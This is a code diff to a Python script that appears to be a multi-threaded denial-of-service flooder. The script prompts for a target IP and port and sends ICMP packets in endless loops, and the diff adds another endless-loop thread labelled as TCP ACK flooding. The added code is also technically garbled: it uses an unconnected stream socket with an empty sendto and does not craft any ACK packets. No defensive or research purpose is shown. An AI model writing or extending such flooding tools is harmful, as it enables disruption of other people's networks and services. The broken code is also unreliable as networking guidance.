@@ -32,6 +32,14 @@ def send_icmp_packets(target_ip):
     while True:
         icmp_socket.sendto(icmp_packet, (target_ip, 1))  # Send ICMP echo request
 
+def send_tcp_ack_packets(target_ip, target_port):
+    tcp_ack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    tcp_ack_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    tcp_ack_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+    
+    while True:
+        tcp_ack_socket.sendto(b'', (target_ip, target_port))
+
 # Prompt the user for target IP address, port, and packet size
 target_ip = input("Enter the target IP address: ")
 target_port = int(input("Enter the target port: "))
@@ -48,3 +56,7 @@ tcp_thread.start()
 # Create and start the ICMP packet sending thread
 icmp_thread = threading.Thread(target=send_icmp_packets, args=(target_ip,))
 icmp_thread.start()
+
+# Create and start the TCP ACK packet sending thread
+tcp_ack_thread = threading.Thread(target=send_tcp_ack_packets, args=(target_ip, target_port))
+tcp_ack_thread.start()
